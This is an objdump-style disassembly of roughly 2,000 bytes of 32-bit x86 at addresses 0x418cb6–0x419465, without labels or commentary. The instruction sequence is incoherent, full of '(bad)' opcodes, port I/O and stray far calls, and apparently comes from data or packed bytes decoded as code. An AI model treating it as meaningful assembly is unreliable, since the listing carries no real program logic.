  418cb6:	ins    BYTE PTR es:[edi],dx
  418cb7:	push   0x4a30052e
  418cbc:	mov    bh,0x90
  418cbe:	jb     0x418c48
  418cc0:	cdq    
  418cc1:	inc    ebx
  418cc2:	mov    bh,0x89
  418cc4:	add    cl,BYTE PTR [ecx]
  418cc6:	jne    0x418cc2
  418cc8:	fdivr  st,st(2)
  418cca:	or     eax,esi
  418ccc:	in     al,dx
  418ccd:	shl    DWORD PTR [esi+0x29004f6b],cl
  418cd3:	jmp    0x418cdf
  418cd5:	cmp    eax,0xae7ed523
  418cda:	retf   0x94e1
  418cdd:	cmp    ebp,esp
  418cdf:	pusha  
  418ce0:	out    0xe9,al
  418ce2:	mov    eax,0x202a76f9
  418ce7:	les    esp,FWORD PTR [ebp-0x64]
  418cea:	sbb    DWORD PTR [eax],edi
  418cec:	unpckhps xmm0,XMMWORD PTR [ebp+0x55]
  418cf0:	pop    ecx
  418cf1:	shl    ebx,1
  418cf3:	mul    bl
  418cf5:	xchg   esp,eax
  418cf6:	add    al,0xea
  418cf8:	iret   
  418cf9:	scas   al,BYTE PTR es:[edi]
  418cfa:	inc    ebp
  418cfb:	fsub   st(3),st
  418cfd:	pushf  
  418cfe:	cmp    eax,0x40a62738
  418d03:	mov    ch,0xde
  418d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d06:	scas   al,BYTE PTR es:[edi]
  418d07:	pmuludq mm5,mm5
  418d0a:	adc    edi,edx
  418d0c:	xor    ecx,DWORD PTR [ebx+ebx*2]
  418d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d10:	and    bl,BYTE PTR [ebx]
  418d12:	sub    eax,0x3869e6c5
  418d17:	adc    esi,DWORD PTR [ecx+edx*2+0x6d24ee8b]
  418d1e:	daa    
  418d1f:	jnp    0x418d80
  418d21:	(bad)  
  418d22:	sub    bh,BYTE PTR [ebx-0x61cd2924]
  418d28:	std    
  418d29:	jne    0x418d53
  418d2b:	iret   
  418d2c:	js     0x418d3b
  418d2e:	out    dx,eax
  418d2f:	out    0xe1,al
  418d31:	not    DWORD PTR [eax]
  418d33:	xchg   esi,eax
  418d34:	mov    ebx,0xd77883a
  418d39:	ss out 0xf0,al
  418d3c:	jne    0x418d39
  418d3e:	mov    esi,0x93147a9c
  418d43:	loop   0x418d9f
  418d45:	fldenv [edi]
  418d47:	mov    DWORD PTR [esi-0x419e78c6],0x222b6db5
  418d51:	stos   DWORD PTR es:[edi],eax
  418d52:	sub    eax,0x4555253d
  418d57:	cmp    edx,DWORD PTR [esi]
  418d59:	sub    ch,cl
  418d5b:	mov    edi,0x59f41039
  418d60:	xchg   esi,eax
  418d61:	outs   dx,BYTE PTR ds:[esi]
  418d62:	mov    edi,0xc288d191
  418d67:	jno    0x418d53
  418d69:	imul   esp,edx,0x393211fc
  418d6f:	mov    ebx,0x492785ab
  418d74:	int3   
  418d75:	jae    0x418da5
  418d77:	ins    BYTE PTR es:[edi],dx
  418d78:	ror    dl,cl
  418d7a:	pop    edx
  418d7c:	cmp    al,0xa0
  418d7e:	addr16 das 
  418d80:	push   ebp
  418d81:	xor    al,0x7f
  418d83:	sbb    al,0xb3
  418d85:	push   ecx
  418d86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d87:	(bad)  
  418d88:	mov    dh,0x44
  418d8a:	add    DWORD PTR [edx],ebp
  418d8c:	sub    ebx,DWORD PTR [eax+0x6c]
  418d8f:	xor    eax,0xd58dad26
  418d94:	(bad)  
  418d95:	adc    al,0x54
  418d97:	das    
  418d98:	pop    eax
  418d99:	mov    ah,al
  418d9b:	mov    esp,0xaaddf722
  418da0:	pop    ss
  418da1:	xor    al,0x8e
  418da3:	or     al,0x70
  418da5:	retf   
  418da6:	and    eax,0xb64924f9
  418dab:	xchg   ebx,eax
  418dac:	addr16 dec eax
  418dae:	(bad)  
  418daf:	int    0x6a
  418db1:	scas   eax,DWORD PTR es:[edi]
  418db2:	cmp    DWORD PTR [ebx],ebp
  418db4:	mov    cl,0x84
  418db6:	call   0x615d4399
  418dbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dbc:	pushf  
  418dbd:	or     al,0xe4
  418dbf:	rol    BYTE PTR [ebx-0x6f],1
  418dc2:	mov    esp,0x66d89f9b
  418dc7:	xor    BYTE PTR [eax-0x1a],ah
  418dca:	adc    al,0xd3
  418dcc:	pop    eax
  418dcd:	adc    eax,0xbe126dd2
  418dd2:	cs mov cl,0x37
  418dd5:	mov    BYTE PTR [ecx],dh
  418dd7:	dec    ecx
  418dd8:	and    eax,0x8bdb3c1c
  418ddd:	push   ecx
  418dde:	daa    
  418ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418de0:	call   0x3907bcac
  418de5:	cmp    dl,cl
  418de7:	and    al,0x8b
  418de9:	je     0x418d9a
  418deb:	ins    DWORD PTR es:[edi],dx
  418dec:	lea    ebp,[esp+eax*8+0x52d3bf30]
  418df3:	xor    ah,BYTE PTR [eax]
  418df5:	retf   
  418df6:	mov    al,0xe8
  418df8:	sbb    al,BYTE PTR [ebx]
  418dfa:	pop    ss
  418dfb:	loopne 0x418ddf
  418dfd:	inc    ebx
  418dfe:	mov    bl,0x93
  418e00:	pusha  
  418e01:	daa    
  418e02:	xchg   ebp,eax
  418e03:	jge    0x418df8
  418e05:	loop   0x418e7e
  418e07:	fs aas 
  418e09:	int    0x39
  418e0b:	leave  
  418e0c:	cli    
  418e0d:	aas    
  418e0e:	xor    ch,BYTE PTR [ebp-0x5aff42da]
  418e14:	sbb    BYTE PTR [ebx+eax*2+0x6d],ah
  418e18:	or     DWORD PTR [ecx],ebp
  418e1a:	in     eax,0x57
  418e1c:	pop    ecx
  418e1d:	sub    eax,0xdd3ab6a9
  418e22:	mov    eax,ds:0x40bcd04e
  418e27:	mov    ah,0x5e
  418e29:	retf   
  418e2a:	jns    0x418e64
  418e2c:	sub    al,0xc7
  418e2e:	add    eax,0x8ace709e
  418e33:	add    al,0xd2
  418e35:	out    dx,al
  418e36:	popa   
  418e37:	or     BYTE PTR [ecx+0xa5b4e38],0xf5
  418e3e:	lock call 0x6938f257
  418e44:	into   
  418e45:	push   ebx
  418e46:	sbb    bh,dh
  418e48:	jmp    0x418dca
  418e4a:	add    dh,ch
  418e4c:	add    BYTE PTR [eax-0x3eb734e3],al
  418e52:	(bad)  
  418e53:	pusha  
  418e54:	inc    ecx
  418e55:	lea    ebp,[edi]
  418e57:	mov    bl,0x55
  418e59:	pop    eax
  418e5a:	jns    0x418e0e
  418e5c:	add    eax,0xe4572d06
  418e61:	int3   
  418e62:	cli    
  418e63:	and    eax,ecx
  418e65:	pop    eax
  418e66:	lods   eax,DWORD PTR ds:[esi]
  418e67:	inc    ecx
  418e68:	dec    ecx
  418e69:	daa    
  418e6a:	add    bl,BYTE PTR [ecx+0x11576c65]
  418e70:	dec    edi
  418e71:	sub    eax,0xa85b6e93
  418e76:	mov    edx,0xb603af51
  418e7b:	xchg   ebx,eax
  418e7c:	iret   
  418e7d:	out    0x57,eax
  418e7f:	aam    0x9e
  418e81:	aas    
  418e82:	cmp    al,0xc7
  418e84:	xor    al,0xce
  418e86:	ffree  st(3)
  418e88:	mov    ebx,0x9efbf6b6
  418e8d:	xchg   ebx,eax
  418e8e:	and    eax,0xf8a06913
  418e93:	mov    edx,0xdb0ad070
  418e98:	mov    edi,0x6e92f60
  418e9d:	xor    bh,cl
  418e9f:	fcomp  QWORD PTR [esi+0x21b186de]
  418ea5:	dec    ebx
  418ea6:	jbe    0x418e6f
  418ea8:	stc    
  418ea9:	clc    
  418eaa:	ss pop esp
  418eac:	or     esi,DWORD PTR [edi-0x39]
  418eaf:	sub    DWORD PTR [ebx+0x42],ebp
  418eb2:	add    al,0x86
  418eb4:	int3   
  418eb5:	cdq    
  418eb6:	add    al,0xfa
  418eb8:	jnp    0x418ebe
  418eba:	jmp    0x316e:0xf0f24fa6
  418ec1:	rcr    DWORD PTR [edx],0xfb
  418ec4:	adc    eax,0x926ee81f
  418ec9:	shr    DWORD PTR [edx+0x43],cl
  418ecc:	xlat   BYTE PTR ds:[ebx]
  418ecd:	ins    BYTE PTR es:[edi],dx
  418ece:	stos   BYTE PTR es:[edi],al
  418ecf:	(bad)  
  418ed0:	icebp  
  418ed1:	rcl    BYTE PTR [edi-0x5d377bd6],0xd3
  418ed8:	mov    bh,0xc1
  418eda:	pop    eax
  418edb:	pop    ebp
  418edc:	out    0x14,al
  418ede:	in     al,dx
  418edf:	fadd   QWORD PTR ds:0xe2a247d4
  418ee5:	call   0xba76:0xfe4ced86
  418eec:	std    
  418eed:	push   esp
  418eee:	sbb    BYTE PTR [ecx+eiz*4],ch
  418ef1:	sbb    eax,0xd028e6a7
  418ef6:	jp     0x418f70
  418ef8:	push   ebp
  418ef9:	xor    ebp,DWORD PTR ds:0x4ac73dee
  418eff:	or     dh,BYTE PTR [ecx]
  418f01:	in     eax,dx
  418f02:	pop    edx
  418f03:	jbe    0x418ebf
  418f05:	inc    ecx
  418f06:	and    esi,edi
  418f08:	test   eax,0x7fca4fe3
  418f0d:	mul    DWORD PTR [ecx]
  418f0f:	mov    esp,DWORD PTR [esp+eax*2+0x64bceb20]
  418f16:	pop    es
  418f17:	xor    DWORD PTR gs:[eax-0x59e20b9f],esi
  418f1e:	mov    eax,ds:0x9e6a1ab4
  418f23:	jbe    0x418eff
  418f25:	mov    ?,WORD PTR [ecx+0x37]
  418f28:	fmul   QWORD PTR [ebx-0x65]
  418f2b:	fidivr DWORD PTR ds:0x83a7534
  418f31:	cmp    DWORD PTR [edi+0x10],0xffffff96
  418f35:	cli    
  418f36:	inc    esp
  418f37:	mov    ds:0xdd8350f9,al
  418f3c:	inc    ecx
  418f3d:	das    
  418f3e:	sub    al,0x26
  418f40:	outs   dx,BYTE PTR ds:[esi]
  418f41:	call   0x31ab:0x48f5b042
  418f48:	and    DWORD PTR ds:0x175cf5e5,ebx
  418f4e:	loopne 0x418f30
  418f50:	pop    edi
  418f51:	mov    dh,0x43
  418f53:	fnstsw WORD PTR [edx+0x47]
  418f56:	inc    esp
  418f57:	and    eax,0xa8304635
  418f5c:	xchg   edx,eax
  418f5d:	lds    edx,FWORD PTR [edi]
  418f5f:	sub    ebx,esi
  418f61:	mov    es,WORD PTR [edx+ebp*8+0x7b]
  418f65:	sub    ecx,DWORD PTR [edx]
  418f67:	es cmp edi,esi
  418f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f6b:	jbe    0x418f86
  418f6d:	add    al,0xd9
  418f6f:	inc    ebx
  418f70:	fidivr DWORD PTR [eiz*1+0x1dbf4ca3]
  418f77:	push   0xffffffc3
  418f79:	dec    eax
  418f7a:	mov    cl,0x58
  418f7c:	mov    esp,0xa13acb76
  418f81:	sbb    al,BYTE PTR [edx+0x6c5a1814]
  418f87:	enter  0x9ab6,0x80
  418f8b:	mov    ebp,0xd653a6de
  418f90:	mov    edx,0xbb0d9e3a
  418f95:	dec    ebp
  418f96:	sbb    BYTE PTR [ecx],dl
  418f98:	mov    dl,0x53
  418f9a:	jge    0x418f4f
  418f9c:	in     eax,dx
  418f9d:	xor    al,0xc1
  418f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fa0:	or     BYTE PTR [ecx+0xb],ah
  418fa3:	fisub  DWORD PTR [esi+edx*2-0x6]
  418fa7:	mov    ds:0x2241ab9c,eax
  418fac:	shl    esp,cl
  418fae:	mov    ch,0x8c
  418fb0:	mov    edi,0x25d3ed0d
  418fb5:	mov    al,0xb9
  418fb7:	jae    0x41902b
  418fb9:	idiv   BYTE PTR [ecx-0x2be95b73]
  418fbf:	adc    bl,0x18
  418fc2:	leave  
  418fc3:	stos   DWORD PTR es:[edi],eax
  418fc4:	rol    DWORD PTR [ecx+edx*4-0x15],cl
  418fc8:	les    esp,FWORD PTR [eax]
  418fca:	loopne 0x418ffd
  418fcc:	aam    0x14
  418fce:	in     eax,dx
  418fcf:	adc    al,0x46
  418fd1:	sub    DWORD PTR [edx],0x787cc8c5
  418fd7:	in     al,0x27
  418fd9:	nop
  418fda:	aas    
  418fdb:	sbb    BYTE PTR fs:[eax+0x4688e575],0xf9
  418fe3:	adc    BYTE PTR [edx+0x6a],cl
  418fe6:	push   0xffffffe6
  418fe8:	xor    al,BYTE PTR [ebp-0x186fc093]
  418fee:	in     al,0x38
  418ff0:	(bad)  
  418ff1:	fmul   QWORD PTR [ebp-0x4531640]
  418ff7:	or     eax,0xb77fae1
  418ffc:	cmp    al,0x5d
  418ffe:	inc    eax
  418fff:	xchg   ebx,eax
  419000:	int    0x43
  419002:	dec    esp
  419003:	inc    ecx
  419004:	out    dx,al
  419005:	cmp    BYTE PTR [edx+0x43],dl
  419008:	imul   ebp,DWORD PTR [ebx-0x670c3564],0x98ead929
  419012:	pop    ebp
  419013:	and    DWORD PTR [ebx-0x5a],edx
  419016:	aad    0xde
  419018:	out    0x6e,eax
  41901a:	mov    ebp,0x9fccb632
  41901f:	shl    ebp,0x77
  419022:	push   edi
  419023:	shl    BYTE PTR [eax],0xe1
  419026:	push   esi
  419027:	in     eax,dx
  419028:	push   eax
  419029:	push   edx
  41902a:	sub    eax,0xaecb7d3e
  41902f:	jle    0x418fd2
  419031:	lahf   
  419032:	stos   DWORD PTR es:[edi],eax
  419033:	cwde   
  419034:	lock outs dx,DWORD PTR ds:[esi]
  419036:	js     0x418fed
  419038:	mov    ds:0x9646fec5,eax
  41903d:	fiadd  WORD PTR [ecx-0x54]
  419040:	(bad)  
  419041:	cli    
  419042:	les    edi,FWORD PTR [edi-0x35]
  419045:	push   esp
  419046:	push   ss
  419047:	push   ecx
  419048:	sbb    eax,0x23b629e5
  41904d:	push   ebx
  41904e:	xor    al,0x6
  419050:	jle    0x419056
  419052:	or     eax,0x59d5f7ab
  419057:	(bad)  
  419058:	ror    dl,0x8c
  41905b:	or     BYTE PTR [edx+0x31],dl
  41905e:	inc    ecx
  41905f:	adc    ebp,DWORD PTR ds:[esp+ebx*8-0x4e6e54f6]
  419067:	outs   dx,BYTE PTR ds:[esi]
  419068:	pop    esp
  419069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41906a:	sub    esi,ebx
  41906c:	push   edx
  41906d:	js     0x419039
  41906f:	ror    BYTE PTR [si],0x18
  419073:	test   eax,0x97a710f9
  419078:	aam    0x52
  41907a:	fbld   TBYTE PTR [ebp-0x33]
  41907d:	lds    ebp,FWORD PTR [edi+0xb]
  419080:	and    al,0xe
  419082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419083:	pop    ss
  419084:	fwait
  419085:	sbb    ecx,DWORD PTR [ecx+eax*2]
  419088:	loope  0x41901e
  41908a:	mov    BYTE PTR [ecx-0x48c50cfd],bh
  419090:	xor    eax,0x6a686c94
  419095:	nop
  419096:	int3   
  419097:	(bad)  
  419098:	pop    ss
  419099:	add    al,0xda
  41909b:	in     al,dx
  41909c:	scas   al,BYTE PTR es:[edi]
  41909d:	ret    0xd831
  4190a0:	pop    edx
  4190a1:	push   esp
  4190a2:	mov    DWORD PTR [esi-0x63],ebp
  4190a5:	push   ds
  4190a6:	cwde   
  4190a7:	std    
  4190a8:	leave  
  4190a9:	std    
  4190aa:	xchg   esi,eax
  4190ab:	pusha  
  4190ac:	cmp    ah,dh
  4190ae:	pop    esp
  4190af:	xchg   ecx,eax
  4190b0:	add    al,0x96
  4190b2:	xchg   bh,bl
  4190b4:	cmp    al,0x9e
  4190b6:	sti    
  4190b7:	xchg   edi,eax
  4190b8:	fisubr WORD PTR [esi+0x10]
  4190bb:	cmp    ebx,edx
  4190bd:	cmp    al,0xf1
  4190bf:	fstp   st(6)
  4190c1:	stos   BYTE PTR es:[edi],al
  4190c2:	adc    dl,BYTE PTR [ebx]
  4190c4:	fcom   DWORD PTR [edx+edx*8-0x26]
  4190c8:	sti    
  4190c9:	add    ah,cl
  4190cb:	sbb    cl,BYTE PTR [eax]
  4190cd:	pop    ebx
  4190ce:	xchg   dh,dl
  4190d0:	xchg   ecx,eax
  4190d1:	add    edx,ebx
  4190d3:	cdq    
  4190d4:	aam    0x1a
  4190d6:	xchg   ebp,eax
  4190d7:	test   al,0x42
  4190d9:	enter  0xe1c6,0x9e
  4190dd:	sbb    eax,0x43e17316
  4190e2:	call   DWORD PTR [ebx]
  4190e4:	jns    0x419165
  4190e6:	clc    
  4190e7:	ss retf 0xaed6
  4190eb:	cmp    al,0xb5
  4190ed:	aam    0xcc
  4190ef:	sbb    ebp,0x573b2f36
  4190f5:	jmp    0x4190be
  4190f7:	inc    eax
  4190f8:	push   ebx
  4190f9:	das    
  4190fa:	dec    esp
  4190fb:	fldenv [edi]
  4190fd:	aaa    
  4190fe:	outs   dx,BYTE PTR ds:[esi]
  4190ff:	mov    ds:0x2eeab2fc,eax
  419104:	and    al,0x8b
  419106:	pusha  
  419107:	xchg   esp,eax
  419108:	stos   DWORD PTR es:[edi],eax
  419109:	ds and eax,edx
  41910c:	aam    0x86
  41910e:	repz in al,0xba
  419111:	cmp    DWORD PTR [ecx+0x4f87da48],ebx
  419117:	popf   
  419118:	mov    DWORD PTR [edi-0x5f1594da],esi
  41911e:	pop    ecx
  41911f:	je     0x41914a
  419121:	jno    0x419119
  419123:	imul   ebx,DWORD PTR [esi-0x22],0x3a
  419127:	fnsave [esi-0x7f82141f]
  41912d:	or     al,BYTE PTR [ebx+0x5d03ab06]
  419133:	(bad)  
  419135:	addr16 jno 0x4191a6
  419138:	ds sub edx,edi
  41913b:	sti    
  41913c:	add    eax,0x7c4164b1
  419141:	pop    es
  419142:	jge    0x419174
  419144:	mov    ecx,0xf8d5fdf
  419149:	or     eax,0x4010e0ae
  41914e:	or     DWORD PTR [eax+0x7d],edx
  419151:	or     edx,DWORD PTR [edi+0x15393cea]
  419157:	mov    edx,edx
  419159:	push   es
  41915a:	mov    cl,0xaf
  41915c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41915d:	push   ebx
  41915e:	mov    al,ds:0x77dd890c
  419163:	xchg   DWORD PTR [edx-0x486bc769],edi
  419169:	int3   
  41916a:	push   0x5c
  41916c:	adc    DWORD PTR [ecx+0x19cbcf2f],esp
  419172:	mov    esi,0xee2a6dd8
  419177:	dec    ecx
  419178:	loope  0x41919b
  41917a:	jmp    0x419192
  41917c:	jp     0x41913f
  41917e:	cvtps2pi mm4,QWORD PTR [esi+eiz*4-0x5a]
  419183:	push   0x7a2df2c6
  419188:	lods   eax,DWORD PTR ds:[esi]
  419189:	dec    eax
  41918a:	call   0x10ae:0x28811469
  419191:	add    eax,0xc563e0a5
  419196:	inc    eax
  419197:	mov    eax,0x44de2bf2
  41919c:	js     0x41917d
  41919e:	aaa    
  41919f:	sub    esi,DWORD PTR [edi]
  4191a1:	xchg   dh,dh
  4191a3:	imul   ebp,DWORD PTR [esi-0x23],0x30
  4191a7:	push   ecx
  4191a8:	not    BYTE PTR [ebx]
  4191aa:	jp     0x4191ca
  4191ac:	test   al,0xee
  4191ae:	mov    ebp,0xe1619bc5
  4191b3:	leave  
  4191b4:	xor    ebp,DWORD PTR [edi-0x1f]
  4191b7:	push   ecx
  4191b8:	shr    ebx,cl
  4191ba:	test   al,0x58
  4191bc:	pop    ss
  4191bd:	push   esi
  4191be:	xor    eax,0xdb2cd9ad
  4191c3:	push   ebx
  4191c4:	rcr    DWORD PTR [edx*8-0x4130a2f9],1
  4191cb:	outs   dx,BYTE PTR ds:[esi]
  4191cc:	lds    edx,FWORD PTR [edi+0x40a11695]
  4191d2:	and    ch,BYTE PTR [eax+edx*4-0x107a05ab]
  4191d9:	pop    ebx
  4191da:	push   edi
  4191db:	in     eax,0xfb
  4191dd:	dec    esp
  4191de:	and    DWORD PTR [ebx+0x20ebc5f5],0x30
  4191e5:	sub    BYTE PTR [ebx+esi*8],bl
  4191e8:	mov    dl,cl
  4191ea:	out    dx,eax
  4191eb:	in     eax,dx
  4191ec:	in     al,0x1c
  4191ee:	fisttp QWORD PTR [edx-0x24]
  4191f1:	sub    al,0xd2
  4191f3:	dec    ebp
  4191f4:	js     0x41918b
  4191f6:	ds jl  0x41918c
  4191f9:	add    al,BYTE PTR [edx+ecx*4]
  4191fc:	fdivr  QWORD PTR [ebx]
  4191fe:	test   BYTE PTR [edx-0x45],cl
  419201:	pop    eax
  419202:	add    DWORD PTR [esi+eiz*8-0x1b],ebp
  419206:	out    dx,eax
  419207:	sbb    esp,DWORD PTR [ebx+edi*8]
  41920a:	jecxz  0x4191ee
  41920c:	sub    DWORD PTR [ecx+0x730eb0db],0x30
  419213:	mov    esp,ds
  419215:	js     0x4191d4
  419217:	fidiv  DWORD PTR ds:0x5b7d847e
  41921d:	inc    eax
  41921e:	add    al,0x37
  419220:	jne    0x4191b7
  419222:	fst    DWORD PTR [eax-0x22]
  419225:	loope  0x4191f2
  419227:	add    DWORD PTR [edi+ebx*4],eax
  41922a:	in     eax,dx
  41922b:	xor    eax,0x1c817310
  419230:	or     edx,DWORD PTR [esi-0x22]
  419233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419234:	ins    DWORD PTR es:[edi],dx
  419235:	mov    al,ds:0x95edb251
  41923a:	mov    BYTE PTR [eax],ch
  41923c:	fdivr  DWORD PTR [esi]
  41923e:	sti    
  41923f:	xor    bh,bh
  419241:	adc    eax,0x465c51f5
  419246:	adc    eax,0x2de94001
  41924b:	inc    eax
  41924c:	add    ebp,edi
  41924e:	jle    0x419260
  419250:	xor    BYTE PTR [esi+0x48],dl
  419253:	ins    DWORD PTR es:[edi],dx
  419254:	jns    0x419264
  419256:	mov    edx,edi
  419258:	xchg   esp,eax
  419259:	adc    bl,dh
  41925b:	xchg   esi,eax
  41925c:	aad    0x33
  41925e:	lock cwde 
  419260:	xor    al,0x70
  419262:	je     0x419287
  419264:	cmp    eax,DWORD PTR [bx+si+0x1c54]
  419269:	inc    edi
  41926a:	or     esp,DWORD PTR [edx]
  41926c:	iret   
  41926d:	ret    0xa376
  419270:	cmp    esi,DWORD PTR [edx]
  419272:	xor    al,0x42
  419274:	xchg   esp,eax
  419275:	aaa    
  419276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419277:	inc    ebp
  419278:	(bad)  
  419279:	push   ds
  41927a:	or     al,0x21
  41927c:	repz repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41927f:	mov    cl,0x41
  419281:	hlt    
  419282:	jne    0x4192d0
  419284:	xchg   edi,eax
  419285:	repz (bad) 
  419287:	imul   ecx,DWORD PTR [eax+0x33],0xffffffee
  41928b:	cmp    dh,BYTE PTR [ebp+0x29d46b71]
  419291:	mov    eax,ds:0xb3f18d2a
  419296:	loop   0x419311
  419298:	ret    0x62cf
  41929b:	mov    bl,0x90
  41929d:	(bad)  
  41929e:	es pushf 
  4192a0:	cmp    edx,edi
  4192a2:	add    bl,dl
  4192a4:	jb     0x419236
  4192a6:	mov    ah,0xde
  4192a8:	xor    BYTE PTR [edx-0x4d],0x99
  4192ac:	(bad)  
  4192ad:	repz repnz adc al,ah
  4192b1:	pop    es
  4192b2:	mov    bh,0x14
  4192b4:	mov    edx,0xd998e786
  4192b9:	(bad)  
  4192ba:	xor    BYTE PTR [ebp-0x4a],dh
  4192bd:	cmp    dl,BYTE PTR [esi+0x23b87f64]
  4192c3:	mov    dh,0x5d
  4192c5:	imul   ebp,DWORD PTR [edi-0x6ae2ed88],0xffffffb1
  4192cc:	add    DWORD PTR [ecx+0x56cfe659],edi
  4192d2:	sti    
  4192d3:	or     DWORD PTR [ecx+0x32],ebx
  4192d6:	fwait
  4192d7:	call   0x1096:0x7e02ff5a
  4192de:	(bad)  
  4192df:	pop    esi
  4192e0:	test   al,0x9
  4192e2:	pop    es
  4192e3:	and    al,0x8a
  4192e5:	sub    eax,0x1f0e352
  4192ea:	inc    esi
  4192eb:	dec    ecx
  4192ec:	push   edx
  4192ed:	sbb    DWORD PTR [ecx+ebp*1+0x36],0xffffffb0
  4192f2:	data16 mov ah,0x6b
  4192f5:	xchg   edi,eax
  4192f6:	inc    esi
  4192f7:	jno    0x419303
  4192f9:	es leave 
  4192fb:	jge    0x41931e
  4192fd:	dec    ebx
  4192fe:	fsub   QWORD PTR [ebx-0x70570e0b]
  419304:	inc    edi
  419305:	add    DWORD PTR [edi+edi*8],esp
  419308:	xchg   esi,eax
  419309:	adc    al,0xd
  41930b:	fadd   DWORD PTR [ebx+0x44]
  41930e:	sti    
  41930f:	cdq    
  419310:	add    DWORD PTR [ecx+0x648e8079],0x6a31b1c0
  41931a:	cmp    BYTE PTR [eax+0x4e2b5d06],bl
  419320:	jecxz  0x41933f
  419322:	dec    esp
  419323:	mov    ah,0x89
  419325:	inc    ebp
  419326:	call   0xac3a3dde
  41932b:	adc    DWORD PTR ds:0x93f3831e,edi
  419331:	arpl   WORD PTR [edi-0x1b],ax
  419334:	sar    dl,1
  419336:	add    DWORD PTR ds:0x13f252e5,eax
  41933c:	mov    ecx,0x1749a040
  419341:	xchg   edx,eax
  419342:	xchg   esp,eax
  419343:	in     eax,0xb1
  419345:	xchg   DWORD PTR [esi+edx*8+0x6c],eax
  419349:	lds    esp,FWORD PTR [eax+eiz*8-0x22f4bbe7]
  419350:	ins    DWORD PTR es:[edi],dx
  419351:	dec    ebx
  419352:	loop   0x4193ca
  419354:	add    BYTE PTR [esi],0x63
  419357:	push   cs
  419358:	js     0x41934b
  41935a:	dec    ah
  41935c:	dec    eax
  41935d:	xchg   ebp,eax
  41935e:	pop    esp
  41935f:	xchg   ebp,eax
  419360:	xchg   edi,eax
  419361:	xor    eax,0x991ec7f6
  419366:	mov    esp,0x76492f09
  41936b:	pminub mm0,QWORD PTR [ebp-0x3b]
  41936f:	dec    ebx
  419370:	mov    ebx,0xc6c08485
  419375:	and    eax,0xd7232f93
  41937a:	mov    esi,0x1ca4de80
  41937f:	pop    edi
  419380:	cli    
  419381:	inc    esp
  419382:	mov    al,0x65
  419384:	fsubr  QWORD PTR [eax]
  419386:	in     eax,dx
  419387:	aam    0x7a
  419389:	mov    ch,0x8e
  41938b:	dec    edx
  41938c:	mov    esp,0x4b75d755
  419391:	test   DWORD PTR [ebx+0x7faa0535],esi
  419397:	cmp    al,0xf0
  419399:	(bad)
  41939c:	add    eax,DWORD PTR [ebx]
  41939e:	sub    dl,ch
  4193a0:	push   0xa1f7fcef
  4193a5:	fcom   QWORD PTR [eax-0x3b96c1a0]
  4193ab:	pop    ds
  4193ac:	pop    edx
  4193ad:	(bad)  
  4193ae:	sub    al,0xaa
  4193b0:	xchg   ebx,eax
  4193b1:	(bad)  
  4193b2:	(bad)  
  4193b3:	push   esi
  4193b4:	call   DWORD PTR [ecx]
  4193b6:	jmp    0x7d0c652e
  4193bb:	rol    cl,1
  4193bd:	pop    ebx
  4193be:	adc    DWORD PTR [esi],ebp
  4193c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193c1:	retf   
  4193c2:	sbb    bl,BYTE PTR cs:[ecx]
  4193c5:	loopne 0x41934e
  4193c7:	adc    DWORD PTR [ecx-0x58],eax
  4193ca:	nop
  4193cb:	std    
  4193cc:	or     bl,BYTE PTR ds:0xbb46b10e
  4193d2:	cmp    al,0xcf
  4193d5:	jb     0x4193a6
  4193d7:	sub    bl,BYTE PTR [ebx]
  4193d9:	loop   0x4193e6
  4193db:	xchg   ecx,eax
  4193dc:	(bad)  [esi]
  4193de:	dec    ebp
  4193df:	int3   
  4193e0:	mov    bh,0x12
  4193e2:	jle    0x41938e
  4193e4:	(bad)  
  4193e6:	push   0xd2d1f47b
  4193eb:	nop
  4193ec:	and    DWORD PTR [ecx],ebp
  4193ee:	(bad)  
  4193ef:	repnz (bad) 
  4193f1:	pop    ds
  4193f2:	sub    eax,0x2d482b50
  4193f7:	retf   0x6fb7
  4193fa:	pop    ds
  4193fb:	inc    eax
  4193fc:	xor    eax,0xe3d86344
  419401:	pop    ecx
  419402:	sub    ah,BYTE PTR [ecx-0x233163f7]
  419408:	or     BYTE PTR [eax],bh
  41940a:	or     ch,BYTE PTR [esi]
  41940c:	add    al,BYTE PTR [esi+0x1]
  41940f:	add    al,0x51
  419411:	sbb    eax,0x4db7238a
  419416:	inc    esp
  419417:	add    esi,DWORD PTR [eax]
  419419:	jnp    0x419457
  41941b:	mov    al,0x42
  41941d:	test   al,0xa9
  41941f:	push   0x5551e648
  419424:	ds pop es
  419426:	ficomp DWORD PTR [edi]
  419428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419429:	int    0xe8
  41942b:	das    
  41942c:	daa    
  41942d:	xchg   ebp,eax
  41942e:	or     al,0x8e
  419430:	ins    DWORD PTR es:[edi],dx
  419431:	ins    DWORD PTR es:[edi],dx
  419432:	scas   eax,DWORD PTR es:[edi]
  419433:	push   esi
  419434:	sbb    BYTE PTR [ebx],0xfa
  419437:	xchg   esi,eax
  419439:	xchg   DWORD PTR cs:[ecx+ebp*4],edx
  41943d:	std    
  41943e:	mov    al,0xee
  419440:	adc    eax,0x67189c13
  419445:	fcom   st(7)
  419447:	push   cs
  419448:	dec    ebp
  419449:	sahf   
  41944a:	mov    ecx,0x5f7f43ad
  41944f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419450:	and    BYTE PTR [edx+0x4c],cl
  419453:	fs cmc 
  419455:	xor    al,0x26
  419457:	lods   al,BYTE PTR ds:[esi]
  419458:	xor    esi,DWORD PTR [esi-0x7bb61ad7]
  41945e:	jae    0x419438
  419460:	lods   al,BYTE PTR ds:[esi]
  419461:	mov    bl,0x44
  419463:	ja     0x4194b1
  419465:	cdq    
